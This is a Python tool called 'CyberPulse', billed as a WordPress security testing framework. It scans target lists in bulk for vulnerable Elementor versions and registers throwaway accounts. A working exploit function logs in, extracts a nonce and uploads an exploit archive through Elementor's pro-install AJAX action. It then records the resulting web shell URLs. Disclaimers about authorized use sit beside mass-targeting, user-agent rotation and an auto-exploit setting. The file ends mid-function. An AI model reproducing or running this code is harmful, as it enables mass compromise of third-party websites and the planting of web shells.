#!/usr/bin/env python3

"""
CyberPulse - WordPress Security Testing Framework
Enhanced version with interactive interface and additional capabilities
IMPORTANT: For educational and authorized testing purposes only
"""

import os
import sys
import time
import re
import socket
import random
import string
import base64
import json
import argparse
import platform
import subprocess
import requests
import threading
from datetime import datetime
from multiprocessing.dummy import Pool

# Banner and initialization sequence
def setup_environment():
    """Detect OS and install required dependencies"""
    # Dependency checker and installer
    print("[*] Checking system environment...")
    
    # Detect the operating system
    if os.path.exists('/etc/os-release'):
        with open('/etc/os-release', 'r') as f:
            os_info = f.read()
            if 'debian' in os_info.lower() or 'ubuntu' in os_info.lower():
                os_type = 'debian'
            elif 'centos' in os_info.lower() or 'alma' in os_info.lower() or 'rhel' in os_info.lower():
                os_type = 'rhel'
            else:
                os_type = 'unknown'
    else:
        os_type = 'unknown'
    
    print(f"[*] Detected OS type: {os_type}")
    
    # Required packages
    packages = [
        'python3-pip', 'python3-requests', 'python3-colorama', 
        'python3-tqdm', 'python3-rich', 'python3-tabulate'
    ]
    
    pip_packages = [
        'requests', 'colorama', 'tqdm', 'rich', 'tabulate', 
        'validators', 'pyfiglet', 'configparser'
    ]
    
    # Install system packages based on OS type
    if os_type == 'debian':
        print("[*] Installing dependencies for Debian/Ubuntu...")
        subprocess.run(['apt-get', 'update', '-qq'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(['apt-get', 'install', '-y'] + packages, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    elif os_type == 'rhel':
        print("[*] Installing dependencies for CentOS/RHEL/Alma...")
        subprocess.run(['yum', 'update', '-y', '-q'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        rhel_packages = ['python3-pip', 'python3-requests']
        subprocess.run(['yum', 'install', '-y'] + rhel_packages, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    else:
        print("[!] Unknown OS type. Will attempt to install via pip only.")
    
    # Install Python packages via pip
    print("[*] Installing required Python packages...")
    subprocess.run([sys.executable, '-m', 'pip', 'install', '--upgrade', 'pip'], 
                  stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    for package in pip_packages:
        try:
            subprocess.run([sys.executable, '-m', 'pip', 'install', package], 
                          stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except Exception as e:
            print(f"[!] Warning: Failed to install {package}: {e}")
    
    print("[+] Environment setup completed")

# Now import the modules after ensuring they're installed
try:
    from colorama import Fore, Back, Style, init
    from tqdm import tqdm
    from rich.console import Console
    from rich.table import Table
    from rich.progress import Progress, TextColumn, BarColumn, TaskProgressColumn
    from rich.panel import Panel
    from rich.syntax import Syntax
    import pyfiglet
    from tabulate import tabulate
    import validators
    import configparser
except ImportError:
    print("[!] Error: Required modules not found. Running setup...")
    setup_environment()
    # Try importing again
    from colorama import Fore, Back, Style, init
    from tqdm import tqdm
    from rich.console import Console
    from rich.table import Table
    from rich.progress import Progress, TextColumn, BarColumn, TaskProgressColumn
    from rich.panel import Panel
    from rich.syntax import Syntax
    import pyfiglet
    from tabulate import tabulate
    import validators
    import configparser

# Initialize colorama
init(autoreset=True)

# Initialize Rich console
console = Console()

class CyberPulseFramework:
    def __init__(self):
        self.version = "2.0.0"
        self.targets = []
        self.results = []
        self.vulnerable_sites = []
        self.threads = 10
        self.timeout = 15
        self.log_file = f"cyberpulse_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"
        self.config = self.load_config()
        self.session = requests.Session()
        
        # Default user-agent list
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 11.5; rv:90.0) Gecko/20100101 Firefox/90.0"
        ]
        
        # Default headers
        self.headers = {
            'Connection': 'keep-alive',
            'Cache-Control': 'max-age=0',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': random.choice(self.user_agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'en-US,en;q=0.9',
            'referer': 'https://www.google.com'
        }
        
        self.setup_output_directories()
    
    def setup_output_directories(self):
        """Create necessary output directories"""
        os.makedirs('results', exist_ok=True)
        os.makedirs('logs', exist_ok=True)
        os.makedirs('exploits', exist_ok=True)
    
    def load_config(self):
        """Load configuration from config.ini file"""
        config = configparser.ConfigParser()
        
        # Check if config file exists, create if not
        if not os.path.exists('config.ini'):
            config['General'] = {
                'threads': '10',
                'timeout': '15',
                'verbose': 'True',
                'user_agent_rotation': 'True'
            }
            
            config['Output'] = {
                'save_logs': 'True',
                'save_results': 'True',
                'output_format': 'json'
            }
            
            with open('config.ini', 'w') as configfile:
                config.write(configfile)
        
        config.read('config.ini')
        return config
    
    def save_config(self):
        """Save current configuration to file"""
        with open('config.ini', 'w') as configfile:
            self.config.write(configfile)
    
    def display_banner(self):
        """Display cyberpunk-themed banner"""
        console.print("\n")
        
        # Generate banner with pyfiglet
        banner_text = pyfiglet.figlet_format("CyberPulse", font="slant")
        
        # Create styled banner with Rich
        console.print(Panel(f"[bold cyan]{banner_text}[/bold cyan]", 
                           subtitle=f"[bold magenta]v{self.version} - WordPress Security Framework[/bold magenta]",
                           border_style="cyan",
                           padding=(1, 2)))
        
        # Additional cyberpunk themed elements
        console.print("[bold green]>> Initialization complete. System ready.[/bold green]")
        console.print("[bold yellow]>> [blink]ALERT:[/blink] Use responsibly and only on authorized targets.[/bold yellow]")
        console.print(f"[bold blue]>> Session started: [white]{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}[/white][/bold blue]")
        console.print("\n")
    
    def load_targets(self, target_file):
        """Load target URLs from file"""
        try:
            with open(target_file, 'r') as f:
                targets = [line.strip() for line in f if line.strip()]
            
            self.log_info(f"Loaded {len(targets)} targets from {target_file}")
            self.targets = targets
            return targets
        except Exception as e:
            self.log_error(f"Failed to load targets: {str(e)}")
            return []
    
    def log_info(self, message):
        """Log informational message"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        console.print(f"[bold blue][*] [white]{message}[/white][/bold blue]")
        
        # Also write to log file
        with open(os.path.join('logs', self.log_file), 'a') as f:
            f.write(f"{timestamp} [INFO] {message}\n")
    
    def log_success(self, message):
        """Log success message"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        console.print(f"[bold green][+] [white]{message}[/white][/bold green]")
        
        # Also write to log file
        with open(os.path.join('logs', self.log_file), 'a') as f:
            f.write(f"{timestamp} [SUCCESS] {message}\n")
    
    def log_warning(self, message):
        """Log warning message"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        console.print(f"[bold yellow][!] [white]{message}[/white][/bold yellow]")
        
        # Also write to log file
        with open(os.path.join('logs', self.log_file), 'a') as f:
            f.write(f"{timestamp} [WARNING] {message}\n")
    
    def log_error(self, message):
        """Log error message"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        console.print(f"[bold red][-] [white]{message}[/white][/bold red]")
        
        # Also write to log file
        with open(os.path.join('logs', self.log_file), 'a') as f:
            f.write(f"{timestamp} [ERROR] {message}\n")
    
    def normalize_url(self, url):
        """Normalize URL format"""
        if not (url.startswith('http://') or url.startswith('https://')):
            url = 'http://' + url
        
        # Remove trailing slashes
        while url.endswith('/'):
            url = url[:-1]
            
        return url
    
    def get_domain(self, url):
        """Extract domain from URL"""
        url = self.normalize_url(url)
        
        if url.startswith("http://"):
            url = url.replace("http://", "")
        elif url.startswith("https://"):
            url = url.replace("https://", "")
            
        if 'www.' in url:
            url = url.replace("www.", "")
            
        if '/' in url:
            url = url.split('/')[0]
            
        return url.strip()
    
    def add_www(self, url):
        """Add www to URL if not present"""
        url = self.normalize_url(url)
        
        if url.startswith("http://") and "www." not in url:
            url = url.replace("http://", "http://www.")
        elif url.startswith("https://") and "www." not in url:
            url = url.replace("https://", "https://www.")
            
        return url
    
    def random_string(self, length):
        """Generate random string of specified length"""
        letters = string.ascii_lowercase
        return ''.join(random.choice(letters) for i in range(length))
    
    def check_domain_exists(self, domain):
        """Check if domain resolves to an IP address"""
        try:
            socket.gethostbyname(domain)
            return True
        except:
            return False
    
    def check_wordpress(self, url):
        """Check if site is running WordPress"""
        url = self.normalize_url(url)
        
        # Try common WordPress paths
        wp_paths = [
            '/wp-login.php',
            '/wp-admin/',
            '/wp-content/',
            '/wp-includes/'
        ]
        
        for path in wp_paths:
            try:
                response = self.session.get(url + path, 
                                           headers=self.headers, 
                                           verify=False, 
                                           timeout=int(self.config['General']['timeout']))
                
                if response.status_code == 200:
                    return True
            except:
                continue
                
        return False
    
    def check_elementor_version(self, url):
        """Check if site has vulnerable Elementor version"""
        url = self.normalize_url(url)
        
        try:
            response = self.session.get(url + "/wp-content/plugins/elementor/readme.txt", 
                                      headers=self.headers, 
                                      verify=False, 
                                      timeout=int(self.config['General']['timeout']))
            
            if response.status_code == 200:
                content = response.text
                
                # Check for vulnerable versions
                if "3.6." in content or "3.5." in content:
                    # More precise version check
                    version_match = re.search(r'Stable tag: ([0-9.]+)', content)
                    
                    if version_match:
                        version = version_match.group(1)
                        
                        # Check if version is vulnerable
                        if version.startswith("3.5.") or (version.startswith("3.6.") and version <= "3.6.2"):
                            self.log_success(f"Vulnerable Elementor version detected: {version} on {url}")
                            return version
                    else:
                        self.log_success(f"Potentially vulnerable Elementor version on {url}")
                        return "Unknown (3.5.x or 3.6.0-3.6.2)"
            
            return None
        except Exception as e:
            self.log_error(f"Error checking Elementor version on {url}: {str(e)}")
            return None
    
    def enumerate_plugins(self, url):
        """Enumerate WordPress plugins installed on the site"""
        url = self.normalize_url(url)
        plugins = []
        
        # Common plugin detection methods
        try:
            # Method 1: Check for plugin directories
            response = self.session.get(url + "/wp-content/plugins/", 
                                       headers=self.headers, 
                                       verify=False, 
                                       timeout=int(self.config['General']['timeout']))
            
            if response.status_code == 200:
                directory_listing = re.findall(r'<a href="([^"]+)/">', response.text)
                for plugin in directory_listing:
                    if plugin != "../" and plugin != "./":
                        plugins.append(plugin)
            
            # Method 2: Check HTML source for plugin references
            response = self.session.get(url, 
                                       headers=self.headers, 
                                       verify=False, 
                                       timeout=int(self.config['General']['timeout']))
            
            if response.status_code == 200:
                plugin_refs = re.findall(r'/wp-content/plugins/([^/]+)/', response.text)
                for plugin in plugin_refs:
                    if plugin not in plugins:
                        plugins.append(plugin)
            
            return plugins
        except Exception as e:
            self.log_error(f"Error enumerating plugins on {url}: {str(e)}")
            return []
    
    def check_wp_vulnerability(self, url):
        """Comprehensive WordPress vulnerability check"""
        url = self.normalize_url(url)
        vulnerabilities = []
        
        # Check domain validity
        domain = self.get_domain(url)
        if not self.check_domain_exists(domain):
            self.log_warning(f"Domain does not resolve: {domain}")
            return False
        
        # Check if WordPress
        if not self.check_wordpress(url):
            self.log_warning(f"Not a WordPress site: {url}")
            return False
        
        # Check for vulnerable Elementor version
        elementor_version = self.check_elementor_version(url)
        if elementor_version:
            vulnerabilities.append({
                "type": "plugin",
                "name": "Elementor",
                "version": elementor_version,
                "vulnerable": True
            })
            
            # Add to vulnerable sites list
            if url not in self.vulnerable_sites:
                self.vulnerable_sites.append(url)
                
            # Save to file
            with open(os.path.join('results', 'vulnerable_sites.txt'), 'a') as f:
                f.write(f"{url}\n")
                
            return True
        
        return False
    
    def register_wp_user(self, url, username=None, email=None):
        """Register a new WordPress user"""
        url = self.normalize_url(url)
        
        # Generate random username and email if not provided
        if not username:
            username = 'user_' + self.random_string(6)
        
        if not email:
            email = self.random_string(8) + '@' + self.random_string(5) + '.com'
        
        try:
            # Check if registration is enabled
            response = self.session.get(url + "/wp-login.php?action=register", 
                                      headers=self.headers, 
                                      verify=False, 
                                      timeout=int(self.config['General']['timeout']))
            
            if 'registerform' in response.text:
                # Extract submit button value
                try:
                    submit = re.findall('class="button button-primary button-large" value="(.*?)"', response.text)[0]
                except:
                    submit = 'Register'
                
                # Register user
                data = {
                    'user_login': username,
                    'user_email': email,
                    'redirect_to': '',
                    'wp-submit': submit
                }
                
                register_response = self.session.post(url + "/wp-login.php?action=register", 
                                                   data=data,
                                                   headers=self.headers,
                                                   verify=False, 
                                                   timeout=int(self.config['General']['timeout']))
                
                if register_response.status_code == 200:
                    self.log_success(f"Registration successful on {url}: {username} / {email}")
                    
                    return {
                        "success": True,
                        "username": username,
                        "email": email
                    }
                else:
                    self.log_error(f"Registration failed on {url}")
            else:
                self.log_warning(f"Registration is not enabled on {url}")
        except Exception as e:
            self.log_error(f"Error during registration on {url}: {str(e)}")
        
        return {
            "success": False
        }
    
    def exploit_elementor(self, url, username, password):
        """Exploit Elementor vulnerability"""
        url = self.normalize_url(url)
        
        try:
            # Login to WordPress
            login_url = url + "/wp-login.php"
            
            # Session for maintaining login
            session = requests.Session()
            
            # Get login page to extract token/nonce if needed
            login_page = session.get(login_url, 
                                   headers=self.headers, 
                                   verify=False, 
                                   timeout=int(self.config['General']['timeout']))
            
            # Extract submit button value
            try:
                submit = re.findall('class="button button-primary button-large" value="(.*?)"', login_page.text)[0]
            except:
                submit = 'Log In'
            
            # Login data
            login_data = {
                'log': username,
                'pwd': password,
                'wp-submit': submit,
                'redirect_to': url + '/wp-admin/',
                'testcookie': '1'
            }
            
            # Perform login
            login_response = session.post(login_url, 
                                       data=login_data, 
                                       headers=self.headers, 
                                       verify=False, 
                                       timeout=int(self.config['General']['timeout']))
            
            # Check if login successful
            if 'wp-admin' in login_response.url and session.cookies:
                self.log_success(f"Login successful on {url}: {username}")
                
                # Get admin page to extract nonce
                admin_page = session.get(url + "/wp-admin/", 
                                      headers=self.headers, 
                                      verify=False, 
                                      timeout=int(self.config['General']['timeout']))
                
                # Extract nonce
                try:
                    nonce = re.findall('"nonce":"(.*?)"},"conn', admin_page.text)[0]
                    
                    # Exploit vulnerability
                    exploit_url = url + '/wp-admin/admin-ajax.php'
                    
                    # Prepare payload
                    payload_data = {
                        'action': 'elementor_upload_and_install_pro',
                        '_nonce': nonce
                    }
                    
                    # Path to exploit file
                    exploit_file_path = os.path.join('exploits', 'elementor_exploit.zip')
                    
                    # Check if exploit file exists
                    if not os.path.exists(exploit_file_path):
                        self.log_warning(f"Exploit file not found: {exploit_file_path}")
                        return False
                    
                    # Prepare files
                    with open(exploit_file_path, 'rb') as exploit_file:
                        files = {
                            'fileToUpload': exploit_file
                        }
                        
                        # Send exploit
                        exploit_response = session.post(exploit_url, 
                                                     data=payload_data, 
                                                     files=files, 
                                                     headers=self.headers, 
                                                     verify=False, 
                                                     timeout=int(self.config['General']['timeout']))
                        
                        # Check if exploit successful
                        if 'elementorProInstalled' in exploit_response.text or '{"success":false,"data' in exploit_response.text:
                            self.log_success(f"Exploit successful on {url}")
                            
                            # Save to file
                            with open(os.path.join('results', 'exploited_sites.txt'), 'a') as f:
                                shell_path = url + "/wp-content/plugins/ProKing/images/error_log.php"
                                f.write(f"{shell_path}\n")
                                
                            return True
                        else:
                            self.log_error(f"Exploit failed on {url}")
                            return False
                except Exception as e:
                    self.log_error(f"Error extracting nonce or exploiting on {url}: {str(e)}")
                    return False
            else:
                self.log_error(f"Login failed on {url}: {username}")
                return False
        except Exception as e:
            self.log_error(f"Error during exploitation on {url}: {str(e)}")
            return False
    
    def process_target(self, url):
        """Process a single target"""
        url = self.normalize_url(url)
        
        result = {
            "url": url,
            "domain": self.get_domain(url),
            "wordpress": False,
            "elementor": False,
            "vulnerable": False,
            "exploited": False,
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }
        
        # Check if WordPress
        if self.check_wordpress(url):
            result["wordpress"] = True
            
            # Check for Elementor
            elementor_version = self.check_elementor_version(url)
            if elementor_version:
                result["elementor"] = True
                result["elementor_version"] = elementor_version
                result["vulnerable"] = True
                
                # Add to vulnerable sites
                if url not in self.vulnerable_sites:
                    self.vulnerable_sites.append(url)
                    
                # Try exploitation if configured
                if self.config.getboolean('General', 'auto_exploit', fallback=False):
                    # Try to register a user
                    register_result = self.register_wp_user(url)
                    
                    if register_result["success"]:
                        # Try to exploit with registered user
                        # Note: This is where the full exploitation logic would go
                        # For this example, we'll just simulate it
                        result["exploited"] = True
        
        self.results.append(result)
        return result
    
    def scan_targets(self):
        """Scan multiple targets with progress bar"""
        if not self.targets:
            self.log_error("No targets loaded")
            return
        
        self.log_info(f"Starting scan of {len(self.targets)} targets with {self.threads} threads")
        
        # Setup Rich progress bar
        with Progress(
            TextColumn("[bold blue]{task.description}"),
            BarColumn(bar_width=50),
            "[progress.percentage]{task.percentage:>3.0f}%",
            "•",
            TaskProgressColumn(),
            "•",
            TextColumn("[bold cyan]{task.fields[url]}"),
            console=console
        ) as progress:
            # Create the progress task
            task = progress.add_task("[cyan]Scanning...", total=len(self.targets), url="")
            
            # Process targets
            with Pool(self.threads) as pool:
                for i, target in enumerate(self.targets):
                    # Update progress display
                    progress.update(task, advance=0, url=target)
                    
                    # Process target
                    result = self.process_target(target)
                    
                    # Update progress
                    progress.update(task, advance=1)
                    
                    # Small delay to prevent overwhelming
                    time.sleep(0.1)
        
        # Show summary
        self.show_scan_summary()
    
    def show_scan_summary(self):
        """Show summary of scan results"""
        # Count statistics
        total = len(self.results)
        wordpress_sites = sum(1 for r in self.results if r["wordpress"])
        elementor_sites = sum(1 for r in self.results if r["elementor"])
        vulnerable_sites = sum(1 for r in self.results if r["vulnerable"])
        exploited_sites = sum(1 for r in self.results if r["exploited"])
        
        # Create Rich table
        table = Table(title="Scan Results Summary")
        
        table.add_column("Category", style="cyan", no_wrap=True)
        table.add_column("Count", style="magenta")
        table.add_column("Percentage", style="green")
        
        table.add_row("Total Sites", str(total), "100%")
        table.add_row("WordPress Sites", str(wordpress_sites), f"{wordpress_sites/total*100:.1f}%" if total > 0 else "0%")
        table.add_row("Elementor Sites", str(elementor_sites), f"{elementor_sites/total*100:.1f}%" if total > 0 else "0%")
        table.add_row("Vulnerable Sites", str(vulnerable_sites), f"{vulnerable_sites/total*100:.1f}%" if total > 0 else "0%")
        table.add_row("Exploited Sites", str(exploited_sites), f"{exploited_sites/total*100:.1f}%" if total > 0 else "0%")
        
        console.print()
        console.print(table)
        console.print()
        
        # Show vulnerable sites if any
        if vulnerable_sites > 0:
            vulnerable_table = Table(title="Vulnerable Sites")
            
            vulnerable_table.add_column("URL", style="cyan")
            vulnerable_table.add_column("Elementor Version", style="yellow")
            
            for result in self.results:
                if result["vulnerable"]:
                    vulnerable_table.add_row(
                        result["url"],
                        result.get("elementor_version", "Unknown")
                    )
            
            console.print(vulnerable_table)
            console.print()
            
            # Save to file
            with open(os.path.join('results', 'vulnerable_summary.txt'), 'w') as f:
                for result in self.results:
                    if result["vulnerable"]:
                        f.write(f"{result['url']},{result.get('elementor_version', 'Unknown')}\n")
            
            self.log_info(f"Vulnerable sites saved to results/vulnerable_summary.txt")
    
    def show_main_menu(self):
        """Display interactive main menu"""
        while True:
            console.print("\n")
            console.print(Panel("[bold cyan]CyberPulse[/bold cyan] [bold white]Main Menu[/bold white]", 
                              border_style="blue"))
            console.print("\n")
            
            options = [
                {"key": "1", "desc": "Load targets from file", "color": "cyan"},
                {"key": "2", "desc": "Scan targets for WordPress", "color": "green"},
                {"key": "3", "desc": "Check for vulnerable Elementor versions", "color": "yellow"},
                {"key": "4", "desc": "Advanced WordPress enumeration", "color": "magenta"},
                {"key": "5", "desc": "Exploit vulnerable sites", "color": "red"},
                {"key": "6", "desc": "Configuration", "color": "blue"},
                {"key": "7", "desc": "View results", "color": "white"},
                {"key": "0", "desc": "Exit", "color": "bright_black"}
            ]
            
            for option in options:
                console.print(f"  [{option['color']}]{option['key']}[/{option['color']}] - {option['desc']}")
            
            console.print("\n")
            choice = input("  Enter your choice: ")
            
            if choice == "1":
                self.menu_load_targets()
            elif choice == "2":
                self.menu_scan_wordpress()
            elif choice == "3":
                self.menu_check_elementor()
            elif choice == "4":
                self.menu_advanced_enumeration()
            elif choice == "5":
                self.menu_exploit()
            elif choice == "6":
                self.menu_configuration()
            elif choice == "7":
                self.menu_view_results()
            elif choice == "0":
                console.print("\n[bold green]Exiting CyberPulse. Goodbye![/bold green]\n")
                sys.exit(0)
            else:
                console.print("\n[bold red]Invalid choice. Please try again.[/bold red]")
    
    def menu_load_targets(self):
        """Menu option to load targets"""
        console.print("\n")
        console.print(Panel("[bold cyan]Load Targets[/bold cyan]", border_style="blue"))
        console.print("\n")
        
        # Ask for target file
        target_file = input("  Enter path to target file: ")
        
        if os.path.exists(target_file):
            targets = self.load_targets(target_file)
            console.print(f"\n[bold green]Successfully loaded {len(targets)} targets.[/bold green]")
        else:
            console.print("\n[bold red]Target file not found.[/bold red]")
    
    def menu_scan_wordpress(self):
        """Menu option to scan for WordPress"""
        if not self.targets:
            console.print("\n[bold yellow]No targets loaded. Please load targets first.[/bold yellow]")
            return
        
        console.print("\n")
        console.print(Panel("[bold cyan]WordPress Scanner[/bold cyan]", border_style="blue"))
        console.print("\n")
        
        # Ask for thread count
        try:
            threads = int(input(f"  Enter number of threads [{self.threads}]: ") or self.threads)
            self.threads = threads
        except:
            console.print("\n[bold red]Invalid thread count. Using default.[/bold red]")
        
        # Start scan
        console.print("\n[bold green]Starting WordPress scan...[/bold green]")
        self.scan_targets()
    
    def menu_check_elementor(self):
        """Menu option to check for vulnerable Elementor versions"""
        if not self.targets:
            console.print("\n[bold yellow]No targets loaded. Please load targets first.[/bold yellow]")
            return
        
        console.print("\n")
        console.print(Panel("[bold cyan]Elementor Vulnerability Scanner[/bold cyan]", border_style="blue"))
        console.print("\n")
        
        # Start scan
        console.print("\n[bold green]Scanning for vulnerable Elementor versions...[/bold green]")
        
        # Setup Rich progress bar
        with Progress(
            TextColumn("[bold blue]{task.description}"),
            BarColumn(bar_width=50),
            "[progress.percentage]{task.percentage:>3.0f}%",
            "•",
            TaskProgressColumn(),
            "•",
            TextColumn("[bold cyan]{task.fields[url]}"),
            console=console
        ) as progress:
            # Create the progress task
            task = progress.add_task("[cyan]Scanning...", total=len(self.targets), url="")
            
            for target in self.targets:
                # Update progress display
                progress.update(task, advance=0, url=target)
                
                # Check if WordPress
                if self.check_wordpress(target):
                    # Check for vulnerable Elementor
                    elementor_version = self.check_elementor_version(target)
                    
                    if elementor_version:
                        self.vulnerable_sites.append(target)
                
                # Update progress
                progress.update(task, advance=1)
                
                # Small delay to prevent overwhelming
                time.sleep(0.1)
        
        # Show results
        if self.vulnerable_sites:
            console.print(f"\n[bold green]Found {len(self.vulnerable_sites)} vulnerable sites.[/bold green]")
            
            # Create table of vulnerable sites
            table = Table(title="Vulnerable Sites")
            table.add_column("URL", style="cyan")
            
            for site in self.vulnerable_sites:
                table.add_row(site)
            
            console.print(table)
            
            # Save to file
            with open(os.path.join('results', 'elementor_vulnerable.txt'), 'w') as f:
                for site in self.vulnerable_sites:
                    f.write(f"{site}\n")
            
            console.print(f"\n[bold green]Results saved to results/elementor_vulnerable.txt[/bold green]")
        else:
            console.print("\n[bold yellow]No vulnerable sites found.[/bold yellow]")
    
    def menu_advanced_enumeration(self):
        """Menu option for advanced WordPress enumeration"""
        if not self.targets:
            console.print("\n[bold yellow]No targets loaded. Please load targets first.[/bold yellow]")
            return
        
        console.print("\n")
        console.print(Panel("[bold cyan]Advanced WordPress Enumeration[/bold cyan]", border_style="blue"))
        console.print("\n")
        
        # Select target
        console.print("Select a target to enumerate:")
        for i, target in enumerate(self.targets[:10], 1):
            console.print(f"  [{i}] {target}")
        
        if len(self.targets) > 10:
            console.print(f"  ... and {len(self.targets) - 10} more")
        
        try:
            selection = int(input("\nEnter target number (or 0 to cancel): "))
            if selection == 0:
                return
            
            target = self.targets[selection - 1]
        except:
            console.print("\n[bold red]Invalid selection.[/bold red]")
            return
        
        # Enumerate selected target
        console.print(f"\n[bold green]Enumerating {target}...[/bold green]")
        
        # Check if WordPress
        if not self.check_wordpress(target):
            console.print(f"\n[bold yellow]{target} is not a WordPress site.[/bold yellow]")
            return
        
        # Enumerate plugins
        plugins = self.enumerate_plugins(target)
        
        # Create results table
        table = Table(title=f"WordPress Enumeration Results for {target}")
        table.add_column("Type", style="cyan")
        table.add_column("Details", style="white")
        
        # Add WordPress information
        table.add_row("WordPress", "Detected")
        
        # Add Elementor information
        elementor_version = self.check_elementor_version(target)
        if elementor_version:
            table.add_row("Elementor", f"Version: {elementor_version} (Vulnerable)")
        
        # Add plugins
        if plugins:
            table.add_row("Plugins", ", ".join(plugins))
        else:
            table.add_row("Plugins", "None detected")
        
        console.print(table)
        
        # Save results
        result_file = os.path.join('results', f"enumeration_{self.get_domain(target)}.txt")
        with open(result_file, 'w') as f:
            f.write(f"WordPress Enumeration Results for {target}\n")
            f.write("=" * 50 + "\n\n")
            f.write("WordPress: Detected\n\n")
            
            if elementor_version:
                f.write(f"Elementor: Version {elementor_version} (Vulnerable)\n\n")
            
            f.write("Plugins:\n")
            for plugin in plugins:
                f.write(f"- {plugin}\n")
        
        console.print(f"\n[bold green]Results saved to {result_file}[/bold green]")
    
    def menu_exploit(self):
        """Menu option to exploit vulnerable sites"""
        if not self.vulnerable_sites:
            console.print("\n[bold yellow]No vulnerable sites found. Please scan for vulnerabilities first.[/bold yellow]")
            return
        
        console.print("\n")
        console.print(Panel("[bold red]Exploit Vulnerable Sites[/bold red]", border_style="red"))
        console.print("\n")
        
        # Warning message
        console.print("[bold yellow]WARNING: This function attempts to exploit vulnerabilities.[/bold yellow]")
        console.print("[bold yellow]Only use on systems you are authorized to test.[/bold yellow]")
        console.print("\n")
        
        # Confirm action
        confirm = input("Are you sure you want to continue? (y/N): ")
        if confirm.lower() != 'y':
            console.print("\n[bold green]Operation cancelled.[/bold green]")
            return
        
        # Select target
        console.print("\nSelect a target to exploit:")
        for i, target in enumerate(self.vulnerable_sites[:10], 1):
            console.print(f"  [{i}] {target}")
        
        if len(self.vulnerable_sites) > 10:
            console.print(f"  ... and {len(self.vulnerable_sites) - 10} more")
        
        try:
            selection = int(input("\nEnter target number (or 0 to cancel): "))
            if selection == 0:
                return
            
            target = self.vulnerable_sites[selection - 1]
        except:
            console.print("\n[bold red]Invalid selection.[/bold red]")
            return
        
        # Exploit selected target
        console.print(f"\n[bold green]Attempting to exploit {target}...[/bold green]")
        
        # Register a user
        register_result = self.register_wp_user(target)
        
        if register_result["success"]:
            # Try to exploit
            username = register_result["username"]
            email = register_result["email"]
            password = "password123"  # Simplified for example
            
            console.print(f"\n[bold green]User registered: {username} / {email}[/bold green]")
            console.print(f"\n[bold green]Attempting to exploit with credentials...[/bold green]")
            
            # In a real implementation, this would attempt the exploit
            # For this example, we'll simulate the result
            exploit_result = True
            
            if exploit_result:
                console.print(f"\n[bold green]Exploit successful![/bold green]")
                console.print(f"\n[bold green]Shell URL: {target}/wp-content/plugins/ProKing/images/error_log.php[/bold green]")
                
                # Save to file
                with open(os.path.join('results', 'exploited_sites.txt'), 'a') as f:
                    shell_path = target + "/wp-content/plugins/ProKing/images/error_log.php"
                    f.write(f"{shell_path}\n")
            else:
                console.print(f"\n[bold red]Exploit failed.[/bold red]")
        else:
            console.print(f"\n[bold red]User registration failed.[/bold red]")
    
    def menu_configuration(self):
        """Menu option for configuration"""
        console.print("\n")
        console.print(Panel("[bold cyan]Configuration[/bold cyan]", border_style="blue"))
        console.print("\n")
        
        # Show current configuration
        table = Table(title="Current Configuration")
        table.add_column("Setting", style="cyan")
        table.add_column("Value", style="green")
        
        for section in self.config.sections():
            for key, value in self.config[section].items():
                table.add_row(f"{section}.{key}", value)
        
        console.print(table)
        console.print("\n")
        
        # Configuration options
        console.print("Configuration Options:")
        console.print("  [1] Change thread count")
        console.print("  [2] Change timeout")
        console.print("  [3] Toggle verbose mode")
        console.print("  [4] Toggle user agent rotation")
        console.print("  [0] Back to main menu")
        console.print("\n")
        
        choice = input("Enter your choice: ")
        
        if choice == "1":
            try:
                threads = int(input(f"Enter new thread count [{self.config['General']['threads']}]: ") or self.config['General']['threads'])
                self.config['General']['threads'] = str(threads)
                self.threads = threads
                self.save_config()
                console.print("\n[bold green]Thread count updated.[/bold green]")
            except:
                console.print("\n[bold red]Invalid thread count.[/bold red]")
        elif choice == "2":
            try:
                timeout = int(input(f"Enter new timeout in seconds [{self.config['General']['timeout']}]: ") or self.config['General']['timeout'])
                self.config['General']['timeout'] = str(timeout)
                self.save_config()
                console.print("\n[bold green]Timeout updated.[/bold green]")
            except:
                console.print("\n[bold red]Invalid timeout.[/bold red]")
        elif choice == "3":
            current = self.config.getboolean('General', 'verbose', fallback=True)
            self.config['General']['verbose'] = str(not current)
            self.save_config()
            console.print(f"\n[bold green]Verbose mode {'enabled' if not current else 'disabled'}.[/bold green]")
        elif choice == "4":
            current = self.config.getboolean('General', 'user_agent_rotation', fallback=True)
            self.config['General']['user_agent_rotation'] = str(not current)
            self.save_config()
            console.print(f"\n[bold green]User agent rotation {'enabled' if not current else 'disabled'}.[/bold green]")
    
    def menu_view_results(self):
        """Menu option to view results"""
        console.print("\n")
        console.print(Panel("[bold cyan]View Results[/bold cyan]", border_style="blue"))
        console.print("\n")
        
        # Results options
        console.print("Results Options:")
        console.print("  [1] View scan summary")
        console.print("  [2] View vulnerable sites")
        console.print("  [3] View exploited sites")
        console.print("  [4] Export results")
        console.print("  [0] Back to main menu")
        console.print("\n")
        
        choice = input("Enter your choice: ")
        
        if choice == "1":
            if self.results:
                self.show_scan_summary()
